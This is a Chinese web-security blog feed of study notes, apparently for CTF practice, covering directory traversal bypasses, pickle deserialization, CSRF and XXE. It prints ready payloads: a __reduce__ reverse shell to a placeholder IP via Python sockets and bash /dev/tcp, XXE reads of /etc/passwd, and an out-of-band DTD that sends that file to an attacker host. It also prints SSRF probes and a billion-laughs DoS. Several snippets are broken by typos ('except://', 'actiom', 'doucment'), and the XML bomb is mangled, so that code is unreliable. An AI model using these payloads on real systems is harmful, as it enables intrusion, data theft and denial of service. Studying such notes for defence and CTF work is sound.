        <content type="html"><![CDATA[<p>目录穿越（也被称为目录遍历）是通过使用<code>../</code>等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。</p><h2 id="1-利用"><a href="#1-利用" class="headerlink" title="1.利用"></a>1.利用</h2><p>目录遍历的漏洞通过<code>../../../</code>这样的形式来进行目录读取服务器中的文件</p><p><code>../../../../</code>越多多好，因为在终端中，<code>../</code>是返回上一级目录，到根目录使用<code>../</code>会返回当前页面。</p><p>其中url参数:<code>../</code> <code>..\</code> <code>..;/</code>效果一样</p><h3 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h3><p>UNC（Universal Naming Convention）是一种用于标识网络资源的命名约定。在Windows系统中，UNC路径通常用于引用共享文件夹或打印机等网络资源。UNC路径的格式为<code>\\computername\sharedfolder\file</code>，其中<code>computername</code>是网络上的计算机名称<code>sharedfolder</code>是共享的文件夹名称，<code>file</code>是文件名。</p><p>例如访问C盘下的Windows目录中的<code>win.ini</code>文件:<code>\\localhost\c$\windows\win.ini</code></p><p>其中<code>c$</code>表示访问C盘的共享目录</p><h2 id="2-绕过"><a href="#2-绕过" class="headerlink" title="2.绕过"></a>2.绕过</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>单次过滤:<code>....//</code></p><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p><code>%2E%2E%2F</code></p><h3 id="16位Unicode编码"><a href="#16位Unicode编码" class="headerlink" title="16位Unicode编码"></a>16位Unicode编码</h3><p><code>\u002e</code></p><h3 id="超长UTF-8编码"><a href="#超长UTF-8编码" class="headerlink" title="超长UTF-8编码"></a>超长UTF-8编码</h3><p><code>\%e0%40%ae</code></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF2024 Round4-web</title>
      <link href="/2024/02/18/CTF-SICTF2024-Round4/"/>
      <url>/2024/02/18/CTF-SICTF2024-Round4/</url>
      
        <content type="html"><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>懒得写wp了</p><p>本次比赛学到了正则回溯,无列名注入,环境变量注入</p><p>都已经补充到知识点总结中了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF_Round18-web</title>
      <link href="/2024/02/14/CTF-NSSCTF-Round18/"/>
      <url>/2024/02/14/CTF-NSSCTF-Round18/</url>
      
        <content type="html"><![CDATA[<h2 id="门酱想玩什么呢？"><a href="#门酱想玩什么呢？" class="headerlink" title="门酱想玩什么呢？"></a>门酱想玩什么呢？</h2><h2 id="Becomeroot"><a href="#Becomeroot" class="headerlink" title="Becomeroot"></a>Becomeroot</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-Pickle反序列化</title>
      <link href="/2024/02/13/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/02/13/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>详解:<a href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a></p><h2 id="1-相关函数"><a href="#1-相关函数" class="headerlink" title="1.相关函数"></a>1.相关函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pickle.dump(obj, file) ：将对象序列化后保存到文件。<span class="comment">#注:这里的file需要以wb打开(二进制可写模式)</span></span><br><span class="line">pickle.load(file) ：读取文件，将文件中的序列化内容反序列化为对象。<span class="comment">#注:这里的file需要以rb打开(二进制可读模式)</span></span><br><span class="line">pickle.dumps(obj) ：将对象序列化成字符串格式的字节流。</span><br><span class="line">pickle.loads(bytes_obj) ：将字符串格式的字节流反序列化为对象。</span><br></pre></td></tr></table></figure><h2 id="2-Python魔术方法"><a href="#2-Python魔术方法" class="headerlink" title="2.Python魔术方法"></a>2.Python魔术方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__reduce__() ：反序列化时调用。</span><br><span class="line">__reduce_ex__() ：反序列化时调用。</span><br><span class="line">__setstate__() ：反序列化时调用。</span><br><span class="line">__getstate__() ：序列化时调用。</span><br></pre></td></tr></table></figure><h2 id="3-PVM-Python虚拟机"><a href="#3-PVM-Python虚拟机" class="headerlink" title="3.PVM(Python虚拟机)"></a>3.PVM(Python虚拟机)</h2><ul><li><p>生成操作码序列 : pickle模块在序列化Python对象时，会生成一系列操作码（opcode）来表示对象的类型和值</p></li><li><p>反序列化操作码 : 在反序列化时，pickle模块读取操作码序列，并将其解释为Python对象</p></li><li><p>执行操作码</p></li><li><p>构造Python对象</p></li></ul><h2 id="4-opcode"><a href="#4-opcode" class="headerlink" title="4.opcode"></a>4.opcode</h2><p>通过对opcode的编写可以进行Python代码执行、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，并且有的代码不能通过pickle序列化得到</p><p><strong>常用的opcode</strong>:</p><table><thead><tr><th align="center">指令</th><th align="center">描述</th><th align="center">具体写法</th><th align="center">栈上的变化</th></tr></thead><tbody><tr><td align="center">c</td><td align="center">取一个全局对象或import一个模块</td><td align="center">c[module]\n[instance]\n</td><td align="center">获得的对象入栈</td></tr><tr><td align="center">o</td><td align="center">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td align="center">o</td><td align="center">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td></tr><tr><td align="center">i</td><td align="center">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td align="center">i[module]\n[callable]\n</td><td align="center">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td></tr><tr><td align="center">N</td><td align="center">实例化一个None</td><td align="center">N</td><td align="center">获得的对象入栈</td></tr><tr><td align="center">S</td><td align="center">实例化一个字符串对象</td><td align="center">S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td align="center">获得的对象入栈</td></tr><tr><td align="center">V</td><td align="center">实例化一个UNICODE字符串对象</td><td align="center">Vxxx\n</td><td align="center">获得的对象入栈</td></tr><tr><td align="center">I</td><td align="center">实例化一个int对象</td><td align="center">Ixxx\n</td><td align="center">获得的对象入栈</td></tr><tr><td align="center">F</td><td align="center">实例化一个float对象</td><td align="center">Fx.x\n</td><td align="center">获得的对象入栈</td></tr><tr><td align="center">R</td><td align="center">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td align="center">R</td><td align="center">函数和参数出栈，函数的返回值入栈</td></tr><tr><td align="center">.</td><td align="center">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td align="center">.</td><td align="center">无</td></tr><tr><td align="center">(</td><td align="center">向栈中压入一个MARK标记</td><td align="center">(</td><td align="center">MARK标记入栈</td></tr><tr><td align="center">t</td><td align="center">寻找栈中的上一个MARK，并组合之间的数据为元组</td><td align="center">t</td><td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="center">)</td><td align="center">向栈中直接压入一个空元组</td><td align="center">)</td><td align="center">空元组入栈</td></tr><tr><td align="center">l</td><td align="center">寻找栈中的上一个MARK，并组合之间的数据为列表</td><td align="center">l</td><td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="center">]</td><td align="center">向栈中直接压入一个空列表</td><td align="center">]</td><td align="center">空列表入栈</td></tr><tr><td align="center">d</td><td align="center">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td align="center">d</td><td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="center">}</td><td align="center">向栈中直接压入一个空字典</td><td align="center">}</td><td align="center">空字典入栈</td></tr><tr><td align="center">p</td><td align="center">将栈顶对象储存至memo_n</td><td align="center">pn\n</td><td align="center">无</td></tr><tr><td align="center">g</td><td align="center">将memo_n的对象压栈</td><td align="center">gn\n</td><td align="center">对象被压栈</td></tr><tr><td align="center">0</td><td align="center">丢弃栈顶对象</td><td align="center">0</td><td align="center">栈顶对象被丢弃</td></tr><tr><td align="center">b</td><td align="center">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td align="center">b</td><td align="center">栈上第一个元素出栈</td></tr><tr><td align="center">s</td><td align="center">将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td align="center">s</td><td align="center">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td></tr><tr><td align="center">u</td><td align="center">寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td align="center">u</td><td align="center">MARK标记以及被组合的数据出栈，字典被更新</td></tr><tr><td align="center">a</td><td align="center">将栈的第一个元素append到第二个元素(列表)中</td><td align="center">a</td><td align="center">栈顶元素出栈，第二个元素（列表）被更新</td></tr><tr><td align="center">e</td><td align="center">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td align="center">e</td><td align="center">MARK标记以及被组合的数据出栈，列表被更新</td></tr></tbody></table><h2 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h2><p>常出现位置:</p><ol><li><p>通常在解析认证token, session的时候. 现在很多Web服务都使用redis、mongodb、memcached等来存储session等状态信息</p></li><li><p>可能将对象Pickle后存储成磁盘文件</p></li><li><p>可能将对象Pickle后在网络中传输</p></li></ol><h3 id="利用opcode"><a href="#利用opcode" class="headerlink" title="利用opcode"></a>利用opcode</h3><p>例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system(S&#x27;ls&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>详解:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system   <span class="comment">#这两行,字节码为c，形式为c[moudle]\n[instance]\n，导入os.system。并将函数压入stack</span></span><br><span class="line"></span><br><span class="line">(S<span class="string">&#x27;ls&#x27;</span>   <span class="comment">#字节码为(，向stack中压入一个MARK。字节码为S，示例化一个字符串对象&#x27;whoami&#x27;并将其压入stack</span></span><br><span class="line"></span><br><span class="line">tR.      <span class="comment">#字节码为t，寻找栈中MARK，并组合之间的数据为元组。然后通过字节码R执行os.system(&#x27;whoami&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#字节码为.，程序结束，将栈顶元素os.system(&#x27;ls&#x27;)作为返回值</span></span><br></pre></td></tr></table></figure><p>也可以使用picker:<a href="https://github.com/eddieivan01/pker">https://github.com/eddieivan01/pker</a></p><h3 id="利用魔术方法-reduce"><a href="#利用魔术方法-reduce" class="headerlink" title="利用魔术方法(__reduce__())"></a>利用魔术方法(<code>__reduce__()</code>)</h3><p>反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码</p><p><code>__reduce__()</code>类似于php中的<code>__wakeup()</code>魔术方法</p><ul><li>构造payload:利用<code>os.system()</code>或者<code>os.popen()</code></li></ul><p>这两个函数只有以print输出时才会回显，如果是以return返回的就不会显示结果。</p><p>不能回显，可以将执行结果接入一个文件，再访问:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">genpoc</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;</span>  <span class="comment">#要执行的命令</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (s,)</span><br></pre></td></tr></table></figure><ul><li>反弹shell:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">reverse</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        a=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))<span class="comment">#或是return(os.system,(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/7777 0&gt;&amp;1&quot;&#x27;,))</span></span><br><span class="line">a = reverse()</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p><strong>注</strong>:<strong>不同操作系统</strong>pickle反序列化结果有略微差别,所以需要<strong>根据环境</strong>决定在哪里序列化出字符串</p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-CSRF(跨站请求伪造)</title>
      <link href="/2024/02/08/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-CSRF/"/>
      <url>/2024/02/08/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-CSRF/</url>
      
        <content type="html"><![CDATA[<p>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等</p><h2 id="1-利用"><a href="#1-利用" class="headerlink" title="1.利用"></a>1.利用</h2><p>将构造好的POC(例如一张图片,点击后直接跳转到支付),利用你目前的登录状态(你的账户余额),完成恶意操作(完成支付)</p><p>以下<code>xxx.com</code>可以改为恶意网站</p><h3 id="GET方式构造"><a href="#GET方式构造" class="headerlink" title="GET方式构造"></a>GET方式构造</h3><p>例如:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;xxx.com&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>点击图片则跳转</p><p>也可以用其他标签达到跳转效果,例如<code>&lt;a&gt;``&lt;iframe&gt;</code>等</p><h3 id="POST方式构造"><a href="#POST方式构造" class="headerlink" title="POST方式构造"></a>POST方式构造</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">actiom</span>=<span class="string">&#x27;xxx.com&#x27;</span> <span class="attr">method</span>=<span class="string">&#x27;post&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;变量1&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;变量值1&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;变量1&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;变量值1&#x27;</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>doucment.forms[0].submit();<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--自动提交表单&gt;</span></span><br></pre></td></tr></table></figure><p>也可以利用bp的repeater模块中自带的CSRF POC来构造</p><h2 id="2-漏洞探测"><a href="#2-漏洞探测" class="headerlink" title="2.漏洞探测"></a>2.漏洞探测</h2><p>检测是否具有防止CSRF的措施</p><ol><li><p>http Referer头</p></li><li><p>是否设置Token</p></li><li><p>HTTP自定义头</p></li><li><p>二次验证</p></li></ol><p>对于防御,可以也根据这几条下手</p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-XXE(XML外部实体注入)</title>
      <link href="/2024/02/08/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-XXE/"/>
      <url>/2024/02/08/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-XXE/</url>
      
        <content type="html"><![CDATA[<h2 id="1-XML文档"><a href="#1-XML文档" class="headerlink" title="1.XML文档"></a>1.XML文档</h2><ul><li><p>XML文档结构包括<code>XML声明、DTD:文档类型定义（可选）、文档元素</code></p></li><li><p>XML文档可以引用外部文档中的DTD</p></li></ul><h2 id="2-XML文档中的DTD实体"><a href="#2-XML文档中的DTD实体" class="headerlink" title="2.XML文档中的DTD实体"></a>2.XML文档中的DTD实体</h2><p>类似于在DTD中定义变量,方便引用</p><p>分为<code>一般实体</code>和<code>参数实体</code>,而每种实体类型内还存在<code>内部实体</code>和<code>外部实体</code>两种类型</p><h3 id="一般实体"><a href="#一般实体" class="headerlink" title="一般实体"></a>一般实体</h3><p>用<code>&amp;</code>符号引用DTD中定义的一般实体</p><ul><li>内部实体</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="string">&quot;YTM&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY b <span class="string">&quot;666&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;a;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解析后结果为<code>YTM666</code></p><ul><li>外部实体</li></ul><p>DTD中定义时加上<code>SYSTEM</code>作为引用外部实体的标志</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="keyword">SYSTEM</span> <span class="string">&quot;http://yantm666.github.io/password&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解析后结果为<code>http://yantm666.github.io/password</code>内的<strong>文本内容</strong></p><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><p>参数实体只能在DTD中使用,所以一般会结合一般实体以及外部DTD</p><p>用<code>%</code>符号定义和引用参数实体</p><p>可以用来使一个实体给另一个实体赋值</p><p>在无回显XXE中详细介绍</p><h2 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>在XML文档解析处构造利用(修改相应部分的<strong>外部实体</strong>)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>服务器解析后回显,可以读取<code>etc/passwd</code>文件内容</p><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://攻击机IP/evil.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中evil.dtd内容如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % wrapper &quot;&lt;!ENTITY send SYSTEM &#x27;http://攻击机IP/?%passwd;&#x27;&gt;&quot;&gt;</span><br><span class="line">%wrapper</span><br></pre></td></tr></table></figure><p>服务器解析后,会以GET方式向攻击机发送<code>etc/passwd</code>文件内容的请求(因为有问号)</p><p>接下来只需要在攻击机上监听相应端口就可读取文件内容</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>过滤了<code>&lt;!ENTITY</code>,绕过:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://攻击机IP/evil.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;except://ls&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="内网探测-SSRF"><a href="#内网探测-SSRF" class="headerlink" title="内网探测&#x2F;SSRF"></a>内网探测&#x2F;SSRF</h3><p>由于xml实体注入攻击可以利用<code>http://</code>协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.0.100:80&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DDoS攻击"><a href="#DDoS攻击" class="headerlink" title="DDoS攻击"></a>DDoS攻击</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml  version = <span class="string">&quot;1.0&quot;</span> ？&gt; </span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE  LOLZ  [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY  LOL  <span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!ELEMENT LOLZ  (#PCDATA)&gt; </span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!ENTITY  lol1  &quot;</span> &gt; <span class="string">&quot;LOL&quot;</span> &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY  lol2  <span class="string">&quot;＆lol1;＆lol1;＆lol1;＆lol1;＆lol1;＆lol1;＆lol1;＆lol1;＆lol1;＆lol1;&quot;</span> &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY  lol3  <span class="string">&quot;＆lol2;＆lol2;＆lol2;＆lol2;＆lol2;＆lol2;＆lol2;＆lol2;＆lol2;＆lol2;&quot;</span> &gt; </span></span><br><span class="line"><span class="meta">&lt;!ENTITY  lol4  <span class="string">&quot;＆lol3;＆lol3;＆lol3;＆lol3;＆lol3;＆lol3;＆lol3;＆lol3;＆lol3;＆lol3;&quot;</span> &gt; </span></span><br><span class="line"><span class="meta">&lt;!ENTITY  lol4  <span class="string">&quot;＆lol4;＆lol4;＆lol4;＆lol4;＆lol4;＆lol4;＆lol4;＆lol4;＆lol4;＆lol4;&quot;</span> 